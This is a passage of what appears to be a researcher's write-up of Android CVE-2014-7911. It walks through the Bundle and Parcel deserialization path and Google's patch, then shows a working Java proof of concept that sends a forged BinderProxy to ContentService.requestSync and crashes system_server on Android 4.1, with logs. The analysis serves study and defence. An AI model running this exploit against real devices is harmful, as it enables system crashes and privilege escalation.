&lt;h2 id=&#34;key-point-one-how-aadroid-os-binderproxy-becomes-android-os-binderproxy&#34;&gt;Key Point One: How AAdroid.os.BinderProxy Becomes android.os.BinderProxy&lt;/h2&gt;

&lt;p&gt;Firstly, a fake BinderProxy object is put into a Bundle. Look into android source code, we can find:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Function &lt;code&gt;putSerializable()&lt;/code&gt; puts the fake object into &lt;code&gt;Bundle.mMap&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Then the Bundle object is written to a parcel.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;writeToParcel()&lt;/code&gt; calls &lt;code&gt;writeArrayMapInternal()&lt;/code&gt;, write the data in &lt;code&gt;mMap&lt;/code&gt; to parcel.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;writeArrayMapInternal()&lt;/code&gt; calls &lt;code&gt;writeValue(Object v)&lt;/code&gt;, to write the value of &lt;code&gt;mMap&lt;/code&gt; into parcel. If the value is an instance of &lt;code&gt;Serializable&lt;/code&gt;, it calls &lt;code&gt;writeSerializable(Serializable serial)&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;In android 4.4.2, &lt;code&gt;writeSerializable()&lt;/code&gt; is implemented as below. It uses &lt;code&gt;ObjectOutputStream&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public final void writeSerializable(Serializable s) {
    if (s == null) {
        writeString(null);
        return;
    }
    String name = s.getClass().getName();
    writeString(name);
    ByteArrayOutputStream baos = new ByteArrayOutputStream();
    try {
        // Output flat
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(s);
        oos.close();
        writeByteArray(baos.toByteArray());
    } catch (IOException ioe) {
        throw new RuntimeException(&amp;quot;Parcelable encountered &amp;quot; +
            &amp;quot;IOException writing serializable object (name = &amp;quot; + name +
            &amp;quot;)&amp;quot;, ioe);
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;**Then the POC uses &lt;code&gt;Parcel.marshall()&lt;/code&gt; to get a byte array and modify its content, changing &lt;code&gt;AA&lt;/code&gt; to &lt;code&gt;an&lt;/code&gt;. **&lt;/p&gt;

&lt;p&gt;Then &lt;code&gt;unmarshall()&lt;/code&gt; this array to get a new parcel object and send to system_server.&lt;/p&gt;

&lt;h2 id=&#34;key-point-two-how-it-is-triggered&#34;&gt;Key Point Two: How it is triggered&lt;/h2&gt;

&lt;p&gt;Once system_server receive a parcel object from &lt;code&gt;Stub&lt;/code&gt;, function &lt;code&gt;onTransact()&lt;/code&gt; takes the responsibility for reading data from parcel. The bundle will be restore by &lt;code&gt;Parcel.readBundle()&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public final Bundle readBundle(ClassLoader loader) {
    int length = readInt();
    if (length &amp;lt; 0) {
        ... /* omitted */
    }    
    final Bundle bundle = new Bundle(this, length);
    if (loader != null) {
        bundle.setClassLoader(loader);
    }
    return bundle;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Constructor &lt;code&gt;Bundle(Parcel, int)&lt;/code&gt; init &lt;code&gt;Bundle.mParcelledData&lt;/code&gt;, which can be parsed into &lt;code&gt;Bundle.mMap&lt;/code&gt; by &lt;code&gt;unparcel()&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Fake object is get out by fucntion &lt;code&gt;Bundle.getSerializable()&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public Serializable getSerializable(String key) {
    unparcel();
    Object o = mMap.get(key);
    if (o == null) {
        return null;
    }
    try {
        return (Serializable) o;
    } catch (ClassCastException e) {
        typeWarning(key, o, &amp;quot;Serializable&amp;quot;, e);
        return null;
    }
}

synchronized void unparcel() {
        
    /* omitted */

    mParcelledData.readArrayMapInternal(mMap, N, mClassLoader);
    mParcelledData.recycle();
    mParcelledData = null;
}

// when readArrayMapInternal encounters a serializable type, it invokes readSerializable()
public final Serializable readSerializable() {
    String name = readString();
    if (name == null) {
        /* omitted */
    }

    byte[] serializedData = createByteArray();
    ByteArrayInputStream bais = new ByteArrayInputStream(serializedData);
    try {
        ObjectInputStream ois = new ObjectInputStream(bais);
        /* Problems exist here, an mal-formed BinderProxy obj will be created. */
        /* When GC, the vulnerability is triggered */
        return (Serializable) ois.readObject();
    } catch (IOException ioe) {
        /* omitted */
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;google-s-patch&#34;&gt;Google&amp;rsquo;s Patch&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;+    public Class&amp;lt;?&amp;gt; checkAndGetTcObjectClass() throws InvalidClassException {
+        // We check some error possibilities that might cause problems later.
+        boolean wasSerializable = (flags &amp;amp; ObjectStreamConstants.SC_SERIALIZABLE) != 0;
+        boolean wasExternalizable = (flags &amp;amp; ObjectStreamConstants.SC_EXTERNALIZABLE) != 0;
+        if (wasSerializable == wasExternalizable) {
+            throw new InvalidClassException(
+                    getName() + &amp;quot; stream data is corrupt: SC_SERIALIZABLE=&amp;quot; + wasSerializable
+                            + &amp;quot; SC_EXTERNALIZABLE=&amp;quot; + wasExternalizable
+                            + &amp;quot;, classDescFlags must have one or the other&amp;quot;);
+        }
+
+        // TC_ENUM is handled elsewhere. See checkAndGetTcEnumClass().
+        if (isEnum()) {
+            throw new InvalidClassException(
+                    getName() + &amp;quot; local class is incompatible: Local class is an enum, streamed&amp;quot;
+                            + &amp;quot; data is tagged with TC_OBJECT&amp;quot;);
+        }
+
+        // isSerializable() is true if the local class implements Serializable. Externalizable
+        // classes are also Serializable via inheritance.
+        if (!isSerializable()) {
+            throw new InvalidClassException(getName() + &amp;quot; local class is incompatible: Not&amp;quot;
+                    + &amp;quot; Serializable&amp;quot;);
+        }
+
+        // The stream class was externalizable, but is only serializable locally.
+        if (wasExternalizable != isExternalizable()) {
+            throw new InvalidClassException(
+                    getName() + &amp;quot; local class is incompatible: Local class is Serializable, stream&amp;quot;
+                            + &amp;quot; data requires Externalizable&amp;quot;);
+        }
+
+        // The following are left unchecked and thus are treated leniently at this point.
+        // SC_BLOCK_DATA may be set iff SC_EXTERNALIZABLE is set AND version 2 of the protocol is in
+        // use.
+        // SC_ENUM should not be set.
+
+        return forClass();
+    }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;More information in detail, see &lt;a href=&#34;https://android.googlesource.com/platform/libcore/+/738c833d38d41f8f76eb7e77ab39add82b1ae1e2&#34;&gt;android.googlesource.com&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&#34;my-experiment&#34;&gt;My Experiment&lt;/h2&gt;

&lt;h3 id=&#34;one-demo-on-hongmi-android-4-2&#34;&gt;One: Demo on HongMi (android 4.2)&lt;/h3&gt;

&lt;p&gt;I write two apks, a client and a server.&lt;/p&gt;

&lt;p&gt;Client represents the attacker, server represents a system_server. The things client does are the same as POC. Partial of the server&amp;rsquo;s code is:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public class ServiceImpl extends MyService.Stub {
    @Override
    public void setApplicationRestrictions(String packageName, Bundle restrictions, int userHandler) throws RemoteException {
        Log.e(&amp;quot;remote&amp;quot;, packageName);
        Object obj = restrictions.get(&amp;quot;eathis&amp;quot;);
        Log.e(&amp;quot;remote&amp;quot;, obj.getClass().getName());
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Running client doesn&amp;rsquo;t cause a crash of the phone, but the exceptions below:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;03-02 11:21:20.802 4855-4866/cn.ac.iie.cve20147911_server E/remote: test
03-02 11:21:20.815 4855-4866/cn.ac.iie.cve20147911_server E/JavaBinder: *** Uncaught remote exception!  (Exceptions are not yet supported across processes.)
    java.lang.RuntimeException: Parcelable encountered IOException reading a Serializable object (name = AAdroid.os.BinderProxy)
    at android.os.Parcel.readSerializable(Parcel.java:2144)
    at android.os.Parcel.readValue(Parcel.java:2016)
    at android.os.Parcel.readMapInternal(Parcel.java:2226)
    at android.os.Bundle.unparcel(Bundle.java:223)
    at android.os.Bundle.get(Bundle.java:282)
    at cn.ac.iie.cve20147911_server.ServiceImpl.setApplicationRestrictions(ServiceImpl.java:17)
    at cn.ac.iie.cve20147911_server.MyService$Stub.onTransact(MyService.java:61)
    at android.os.Binder.execTransact(Binder.java:351)
    at dalvik.system.NativeStart.run(Native Method)
    Caused by: java.io.InvalidClassException: android.os.BinderProxy local class is incompatible: Not Serializable
        at java.io.ObjectStreamClass.checkAndGetTcObjectClass(ObjectStreamClass.java:1330)
        at java.io.ObjectInputStream.readNewObject(ObjectInputStream.java:1818)
        at java.io.ObjectInputStream.readNonPrimitiveContent(ObjectInputStream.java:787)
        at java.io.ObjectInputStream.readObject(ObjectInputStream.java:2013)
        at java.io.ObjectInputStream.readObject(ObjectInputStream.java:1970)
        at android.os.Parcel.readSerializable(Parcel.java:2142)
        at android.os.Parcel.readValue(Parcel.java:2016)
        at android.os.Parcel.readMapInternal(Parcel.java:2226)
        at android.os.Bundle.unparcel(Bundle.java:223)
        at android.os.Bundle.get(Bundle.java:282)
        at cn.ac.iie.cve20147911_server.ServiceImpl.setApplicationRestrictions(ServiceImpl.java:17)
        at cn.ac.iie.cve20147911_server.MyService$Stub.onTransact(MyService.java:61)
        at android.os.Binder.execTransact(Binder.java:351)
        at dalvik.system.NativeStart.run(Native Method)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;From the call stack, we conclude that the analysis we did before are right, and HongMi&amp;rsquo;s system is patched because there is an exception raised from fucntion &lt;code&gt;ObjectStreamClass.checkAndGetTcObjectClass()&lt;/code&gt; which is added in the patch. Notice that &lt;code&gt;android.os.BinderProxy&lt;/code&gt; appears on the exception.&lt;/p&gt;

&lt;h3 id=&#34;demo-on-huawei-android-4-1&#34;&gt;Demo on HuaWei (android 4.1)&lt;/h3&gt;

&lt;p&gt;Do the same thing on an HuaWei phone, the second exception disappeared!&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;03-02 14:37:00.357 31139-31154/cn.ac.iie.cve20147911_server E/remote: test
03-02 14:37:00.360 31139-31154/cn.ac.iie.cve20147911_server E/JavaBinder: *** Uncaught remote exception!  (Exceptions are not yet supported across processes.)
    java.lang.ClassCastException: android.os.BinderProxy cannot be cast to java.io.Serializable
    at android.os.Parcel.readSerializable(Parcel.java:2142)
    at android.os.Parcel.readValue(Parcel.java:2016)
    at android.os.Parcel.readMapInternal(Parcel.java:2226)
    at android.os.Bundle.unparcel(Bundle.java:223)
    at android.os.Bundle.get(Bundle.java:282)
    at cn.ac.iie.cve20147911_server.ServiceImpl.setApplicationRestrictions(ServiceImpl.java:17)
    at cn.ac.iie.cve20147911_server.MyService$Stub.onTransact(MyService.java:61)
    at android.os.Binder.execTransact(Binder.java:367)
    at dalvik.system.NativeStart.run(Native Method)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This exception is just a ClassCastException, which means android.os.BinderProxy has been created, it just can&amp;rsquo;t be casted to java.io.Serializable.&lt;/p&gt;

&lt;h3 id=&#34;debugging&#34;&gt;Debugging&lt;/h3&gt;

&lt;p&gt;Set a breakpoint in our simulated system-server at this line:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/cve-2014-7911/breakpoint.png&#34; alt=&#34;breakpoint screenshot&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Attach debugger to the process and follow the steps analyzed before, we can track the exucetion to &lt;code&gt;Parcel.readSerializable()&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/cve-2014-7911/readserializable.png&#34; alt=&#34;breakpoint readSerializable()&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;ois.readObject()&lt;/code&gt; suppose to create a android.os.BinderProxy object with its &lt;code&gt;mOrgue&lt;/code&gt; and &lt;code&gt;mObject&lt;/code&gt; set to &lt;code&gt;0x1337beef&lt;/code&gt;, but because of the exception &lt;code&gt;ClassCastException&lt;/code&gt;, tracking will break and debugger will stop there, so that we can&amp;rsquo;t see the result. In order to track the result of &lt;code&gt;ois.readObject()&lt;/code&gt;, I use Xposed to hook &lt;code&gt;Parcel.readSerializable()&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public class HookParcel implements IXposedHookLoadPackage {
    @Override
    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam loadPackageParam) throws Throwable {
        findAndHookMethod(
                &amp;quot;android.os.Parcel&amp;quot;,
                loadPackageParam.classLoader,
                &amp;quot;readSerializable&amp;quot;,
                new XC_MethodHook() {
                    protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                        Parcel parcel = (Parcel) param.thisObject;
                        String name = parcel.readString();
                        if (name == null) {
                            param.setResult(null);
                        } else {
                            byte[] serializedData = parcel.createByteArray();
                            ByteArrayInputStream bais = new ByteArrayInputStream(serializedData);
                            ObjectInputStream ois = new ObjectInputStream(bais);
                            Object obj = ois.readObject();
                            XposedBridge.log(name);
                            if (name.equals(&amp;quot;AAdroid.os.BinderProxy&amp;quot;)) {
                                XposedBridge.log(obj.getClass().getName());
                                if (obj.getClass().getName().equals(&amp;quot;android.os.BinderProxy&amp;quot;)) {
                                    Class clz = obj.getClass();
                                    Field mOrgue = clz.getDeclaredField(&amp;quot;mOrgue&amp;quot;);
                                    Field mObject = clz.getDeclaredField(&amp;quot;mObject&amp;quot;);
                                    mObject.setAccessible(true);
                                    mOrgue.setAccessible(true);
                                    int v_mObject = mObject.getInt(obj);
                                    int v_mOrgue = mOrgue.getInt(obj);
                                    XposedBridge.log(&amp;quot;mObject:&amp;quot; + v_mObject);
                                    XposedBridge.log(&amp;quot;mOrgue:&amp;quot; + v_mOrgue);
                                }
                            }
                            param.setResult((Serializable) obj);
                        }
                    }
                }

        );
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The hook does the same things as the original method, except printing some information we are interested in.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/cve-2014-7911/xposedlog.png&#34; alt=&#34;xposed log&#34; /&gt;&lt;/p&gt;

&lt;h2 id=&#34;write-a-poc-for-android-4-1&#34;&gt;Write A POC for Android 4.1&lt;/h2&gt;

&lt;p&gt;It was until 4.2 that Android added UserManager. But all the phones I get with Android OS version 4.2 and above are patched. The only one that hasn&amp;rsquo;t been patched, its OS version is 4.1, which dosen&amp;rsquo;t have UserManagerService. So I have to find the other system-servers which are exploitable. Here are some properties that an exploitable system-server should have:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;It has functions receive Bundle type parameters.&lt;/li&gt;
&lt;li&gt;The Bundle parameters must perform &lt;code&gt;Bundle.getXXX()&lt;/code&gt; or &lt;code&gt;Bundle.get()&lt;/code&gt; in order to trigger &lt;code&gt;Bundle.unparcel()&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Here I find manually find out the &lt;code&gt;android.content.IContentService&lt;/code&gt; is what I want. It has a method named &lt;code&gt;requestSync()&lt;/code&gt;, the definition in &lt;code&gt;IContentService.aidl&lt;/code&gt; is:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;void requestSync(in Account account, String authority, in Bundle extras);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;com.android.server.content.ContentService&lt;/code&gt; extends &lt;code&gt;IContentService.Stub&lt;/code&gt; and implements its methods. &lt;code&gt;android.content.ContentResolver&lt;/code&gt; can get a proxy of the server through a static method &lt;code&gt;ContentResolver.getContentService&lt;/code&gt;. So the POC on Android 4.1 are like this.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);

    Bundle bundle = new Bundle();
    bundle.putSerializable(&amp;quot;eathis&amp;quot;, new AAdroid.os.BinderProxy());
    bundle.putBoolean(ContentResolver.SYNC_EXTRAS_UPLOAD, false);

    try {
        Class clIContentService = Class.forName(&amp;quot;android.content.IContentService&amp;quot;);
        Class[] csSubClasses = clIContentService.getDeclaredClasses();
        for (Class c: csSubClasses) {
            if (c.getCanonicalName().equals(&amp;quot;android.content.IContentService.Stub&amp;quot;)) {
                clStub = c;
            }
        }
        Field fTRANSACTION_requestSync =
                clStub.getDeclaredField(&amp;quot;TRANSACTION_requestSync&amp;quot;);
        fTRANSACTION_requestSync.setAccessible(true);
        TRANSACTION_requestSync = fTRANSACTION_requestSync.getInt(null);

        ContentResolver resolver = getContentResolver();
        Method mGetContentService = ContentResolver.class.getDeclaredMethod(&amp;quot;getContentService&amp;quot;);
        objProxy = mGetContentService.invoke(resolver);

        Class[] stubSubClasses = clStub.getDeclaredClasses();
        for (Class c: stubSubClasses) {
            if (c.getCanonicalName().equals(&amp;quot;android.content.IContentService.Stub.Proxy&amp;quot;)) {
                clProxy = c;
            }
        }
        Field fRemote = clProxy.getDeclaredField(&amp;quot;mRemote&amp;quot;);
        fRemote.setAccessible(true);
        mRemote = (IBinder) fRemote.get(objProxy);

        AccountManager accountManager = (AccountManager) getSystemService(ACCOUNT_SERVICE);
        Account[] accounts = accountManager.getAccounts();
        requestSync(accounts[0], &amp;quot;test&amp;quot;, bundle);

    } catch (Exception e) {
            e.printStackTrace();
    }
}

public void requestSync(Account account, String authority, Bundle extras) throws  android.os.RemoteException {
    android.os.Parcel _data = android.os.Parcel.obtain();
    android.os.Parcel _reply = android.os.Parcel.obtain();
    try {
        _data.writeInterfaceToken(DESCRIPTOR);
        _data.writeInt(1);
        account.writeToParcel(_data, 0);
        _data.writeString(authority);
        _data.writeInt(1);
        extras.writeToParcel(_data, 0);

        byte[] data = _data.marshall();
        for (int i=0; true; i++) {
            if (data[i] == &#39;A&#39; &amp;amp;&amp;amp; data[i+1] == &#39;A&#39; &amp;amp;&amp;amp; data[i+2] == &#39;d&#39; &amp;amp;&amp;amp; data[i+3] == &#39;r&#39;) {
                data[i] = &#39;a&#39;;
                data[i+1] = &#39;n&#39;;
                break;
            }
        }
        _data.recycle();
        _data = Parcel.obtain();
        _data.unmarshall(data, 0, data.length);
        mRemote.transact(TRANSACTION_requestSync, _data, _reply, 0);
        _reply.readException();
    } finally {
        _reply.recycle();
        _data.recycle();
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Run this application, then do some thing else to trigger GC, the phone is reboot! Logcat records this.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;D/dalvikvm(  366): WAIT_FOR_CONCURRENT_GC blocked 0ms
I/FramebufferNativeWindow(14753):
D/v_gralloc(14753): fb_post info:change to format argb8888
E/dalvikvm(  343): GC_CONCURRENT freed 1966K, 73% free 938K/3395K, paused 11ms+18ms, total 39ms
E/dalvikvm(  366): GC_EXPLICIT freed 5972K, 19% free 38023K/46535K, paused 3ms+13ms, total 110ms
F/libc    (  366): Fatal signal 11 (SIGSEGV) at 0x1337bef3 (code=1), thread 374 (FinalizerDaemon)
D/libEGL  ( 2684): loaded /system/lib/egl/libEGL_VIVANTE.so
D/libEGL  ( 2684): loaded /system/lib/egl/libGLESv1_CM_VIVANTE.so
D/libEGL  ( 2684): loaded /system/lib/egl/libGLESv2_VIVANTE.so
I/DEBUG   (  130): *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***
I/DEBUG   (  130): Build fingerprint: &#39;Huawei/D2-0082/hwD2-0082:4.1.2/HuaweiD2-0082/C00B015:user/ota-rel-keys,release-keys&#39;
I/DEBUG   (  130): pid: 366, tid: 374, name: FinalizerDaemon  &amp;gt;&amp;gt;&amp;gt; system_server &amp;lt;&amp;lt;&amp;lt;
I/DEBUG   (  130): signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 1337bef3
D/OpenGLRenderer( 2684): Enabling debug mode 0
E/dalvikvm(  636): GC_CONCURRENT freed 2539K, 20% free 19968K/24711K, paused 2ms+4ms, total 48ms
D/dalvikvm(  636): WAIT_FOR_CONCURRENT_GC blocked 41ms
I/DEBUG   (  130):     r0 1337beef  r1 401d60f9  r2 50e2a908  r3 5713afe4
I/DEBUG   (  130):     r4 402248ec  r5 1337beef  r6 f2100001  r7 407811a5
I/DEBUG   (  130):     r8 1337beef  r9 1337beef  sl 50e2a918  fp 5cf2ac94
I/DEBUG   (  130):     ip 40222d7c  sp 5cf2ac50  lr 401d5cf3  pc 400d8e44  cpsr 20000030
I/DEBUG   (  130):     d0  0000000100060101  d1  6d782e74012a5c44
I/DEBUG   (  130):     d2  617369646f6e5f61  d3  6f6c6f685f656c65
I/DEBUG   (  130):     d4  1f1f1f1f1f1f1f1f  d5  1f1f1f1f1f1f1f1f
I/DEBUG   (  130):     d6  014a0ff01f1f1f1f  d7  0000005a4ee91870
I/DEBUG   (  130):     d8  0000000000000000  d9  0000000000000000
I/DEBUG   (  130):     d10 0000000000000000  d11 0000000000000000
I/DEBUG   (  130):     d12 0000000000000000  d13 0000000000000000
I/DEBUG   (  130):     d14 0000000000000000  d15 0000000000000000
I/DEBUG   (  130):     d16 0000000300000002  d17 0000000000000000
I/DEBUG   (  130):     d18 0000000000000000  d19 0000000000000000
I/DEBUG   (  130):     d20 1f1f1f1f1f1f1f1f  d21 1f1f1f1f1f1f1f1f
I/DEBUG   (  130):     d22 1f1f1f1f1f1f1f1f  d23 9999999999999999
I/DEBUG   (  130):     d24 1f1f1f1f1f1f1f1f  d25 1f1f1f1f1f1f1f1f
I/DEBUG   (  130):     d26 1f1f1f1f1f1f1f1f  d27 9999999999999999
I/DEBUG   (  130):     d28 0100010001000100  d29 0100010001000100
I/DEBUG   (  130):     d30 9999999999999999  d31 9999999999999999
I/DEBUG   (  130):     scr 20000010
I/DEBUG   (  130): 
I/DEBUG   (  130): backtrace:
I/DEBUG   (  130):     #00  pc 0000ee44  /system/lib/libutils.so (android::RefBase::decStrong(void const*) const+3)
I/DEBUG   (  130):     #01  pc 00065cef  /system/lib/libandroid_runtime.so
I/DEBUG   (  130):     #02  pc 0001df30  /system/lib/libdvm.so (dvmPlatformInvoke+112)
I/DEBUG   (  130):     #03  pc 0004d183  /system/lib/libdvm.so (dvmCallJNIMethod(unsigned int const*, JValue*, Method const*, Thread*)+394)
I/DEBUG   (  130):     #04  pc 00027360  /system/lib/libdvm.so
I/DEBUG   (  130):     #05  pc 0002bc68  /system/lib/libdvm.so (dvmInterpret(Thread*, Method const*, JValue*)+180)
I/DEBUG   (  130):     #06  pc 0005f8f5  /system/lib/libdvm.so (dvmCallMethodV(Thread*, Method const*, Object*, bool, JValue*, std::__va_list)+272)
I/DEBUG   (  130):     #07  pc 0005f91f  /system/lib/libdvm.so (dvmCallMethod(Thread*, Method const*, Object*, JValue*, ...)+20)
I/DEBUG   (  130):     #08  pc 000544d3  /system/lib/libdvm.so
I/DEBUG   (  130):     #09  pc 00012e00  /system/lib/libc.so (__thread_entry+48)
I/DEBUG   (  130):     #10  pc 00012558  /system/lib/libc.so (pthread_create+172)
I/DEBUG   (  130): 
I/DEBUG   (  130): stack:
I/DEBUG   (  130):          5cf2ac10  f2000001  
I/DEBUG   (  130):          5cf2ac14  f2000001  
I/DEBUG   (  130):          5cf2ac18  5cf2ac44  
I/DEBUG   (  130):          5cf2ac1c  5713afe4  /dev/ashmem/dalvik-LinearAlloc (deleted)
I/DEBUG   (  130):          5cf2ac20  40cca768  
I/DEBUG   (  130):          5cf2ac24  f2100001  
I/DEBUG   (  130):          5cf2ac28  5cf2ac44  
I/DEBUG   (  130):          5cf2ac2c  5713afe4  /dev/ashmem/dalvik-LinearAlloc (deleted)
I/DEBUG   (  130):          5cf2ac30  40cca768  
I/DEBUG   (  130):          5cf2ac34  4077efa9  /system/lib/libdvm.so
I/DEBUG   (  130):          5cf2ac38  f2100001  
I/DEBUG   (  130):          5cf2ac3c  407811dd  /system/lib/libdvm.so
I/DEBUG   (  130):          5cf2ac40  40cca768  
I/DEBUG   (  130):          5cf2ac44  50e2a908  
I/DEBUG   (  130):          5cf2ac48  df0027ad  
I/DEBUG   (  130):          5cf2ac4c  00000000  
I/DEBUG   (  130):     #00  5cf2ac50  402248ec  /system/lib/libandroid_runtime.so
I/DEBUG   (  130):          5cf2ac54  40cca768  
I/DEBUG   (  130):          5cf2ac58  f2100001  
I/DEBUG   (  130):          5cf2ac5c  401d5cf3  /system/lib/libandroid_runtime.so
I/DEBUG   (  130):     #01  5cf2ac60  5831a278  /data/dalvik-cache/system@framework@core.jar@classes.dex
I/DEBUG   (  130):          5cf2ac64  5713b048  /dev/ashmem/dalvik-LinearAlloc (deleted)
I/DEBUG   (  130):          5cf2ac68  50e2a908  
I/DEBUG   (  130):          5cf2ac6c  00000000  
I/DEBUG   (  130):          5cf2ac70  57090f70  
I/DEBUG   (  130):          5cf2ac74  5cf2ac80  
I/DEBUG   (  130):          5cf2ac78  57090f68  
I/DEBUG   (  130):          5cf2ac7c  40753f34  /system/lib/libdvm.so (dvmPlatformInvoke+116)
I/DEBUG   (  130):     #02  5cf2ac80  57090f64  
I/DEBUG   (  130):          5cf2ac84  00000001  
I/DEBUG   (  130):          5cf2ac88  42a4e838  /dev/ashmem/dalvik-heap (deleted)
I/DEBUG   (  130):          5cf2ac8c  00000000  
I/DEBUG   (  130):          5cf2ac90  00000000  
I/DEBUG   (  130):          5cf2ac94  40783187  /system/lib/libdvm.so (dvmCallJNIMethod(unsigned int const*, JValue*, Method const*, Thread*)+398)
I/DEBUG   (  130): 
I/DEBUG   (  130): memory near r0:
I/DEBUG   (  130):     1337becc ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337bedc ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337beec ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337befc ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337bf0c ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130): 
I/DEBUG   (  130): memory near r1:
I/DEBUG   (  130):     401d60d8 604060e0 0010f104 608968e1 f7d32100  .`@`.....h.`.!..
I/DEBUG   (  130):     401d60e8 4620eba0 bf00bd10 0004b6c4 0004c702  .. F............
I/DEBUG   (  130):     401d60f8 43f0e92d 68084604 460eb085 28004605  -..C.F.h...F.F.(
I/DEBUG   (  130):     401d6108 80a5f000 49546802 44796a13 b1104798  .....hTI.jyD.G..
I/DEBUG   (  130):     401d6118 69056830 4851e09b 44784f51 ece2f7d3  0h.i..QHQOxD....
I/DEBUG   (  130): 
I/DEBUG   (  130): memory near r2:
I/DEBUG   (  130):     50e2a8e8 00000000 0000001b 00680043 00690072  ........C.h.r.i.
I/DEBUG   (  130):     50e2a8f8 00740073 0061006d 00000073 00000453  s.t.m.a.s...S...
I/DEBUG   (  130):     50e2a908 58b38b40 57090f64 5713b130 5927e000  @..Xd..W0..W..&#39;Y
I/DEBUG   (  130):     50e2a918 40decef8 000021aa 5cf2ada8 00000000  ...@.!.....\....
I/DEBUG   (  130):     50e2a928 5cf2addc 00000006 00000000 407540c0  ...\.........@u@
I/DEBUG   (  130): 
I/DEBUG   (  130): memory near r3:
I/DEBUG   (  130):     5713afc4 00000004 40dfdab8 0000003c 40dfdff8  .......@&amp;lt;......@
I/DEBUG   (  130):     5713afd4 58ee622a 58df4f87 00000012 00000008  *b.X.O.X........
I/DEBUG   (  130):     5713afe4 40dfdff8 58ee0b14 58da66bf 00000002  ...@...X.f.X....
I/DEBUG   (  130):     5713aff4 0000000c 40dfdff8 58edfe02 58da66bf  .......@...X.f.X
I/DEBUG   (  130):     5713b004 00000002 00000010 000000ac 40dfdff8  ...............@
I/DEBUG   (  130): 
I/DEBUG   (  130): memory near r4:
I/DEBUG   (  130):     402248cc 5713ad88 1d2000de 5713a4b8 5713a3f8  ...W.. ....W...W
I/DEBUG   (  130):     402248dc 00000001 570e46b0 00000107 1d2000ea  .....F.W...... .
I/DEBUG   (  130):     402248ec 1d2000ee 5713b010 5713b080 5713aff8  .. ....W...W...W
I/DEBUG   (  130):     402248fc 5713afd0 5713afe4 1d2000f6 5713b448  ...W...W.. .H..W
I/DEBUG   (  130):     4022490c 00000000 5712e128 1d2000b2 1d2000b6  ....(..W.. ... .
I/DEBUG   (  130): 
I/DEBUG   (  130): memory near r5:
I/DEBUG   (  130):     1337becc ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337bedc ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337beec ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337befc ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337bf0c ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130): 
I/DEBUG   (  130): memory near r7:
I/DEBUG   (  130):     40781184 693b0f40 18c2d005 46204629 e824f7dd  @.;i....)F F..$.
I/DEBUG   (  130):     40781194 18c0e002 4500e9c0 f7fda801 bdfefefd  .......E........
I/DEBUG   (  130):     407811a4 4606b5f7 a801460c 46154631 f7fd461f  ...F.F..1F.F.F..
I/DEBUG   (  130):     407811b4 9801fecf f7fe4621 68ebfec7 0f40f013  ....!F.....h..@.
I/DEBUG   (  130):     407811c4 bf08692b d00450c7 8f5ef3bf f3bf50c7  +i...P....^..P..
I/DEBUG   (  130): 
I/DEBUG   (  130): memory near r8:
I/DEBUG   (  130):     1337becc ffffffff ffffffff ffffffff ffffffff  ................
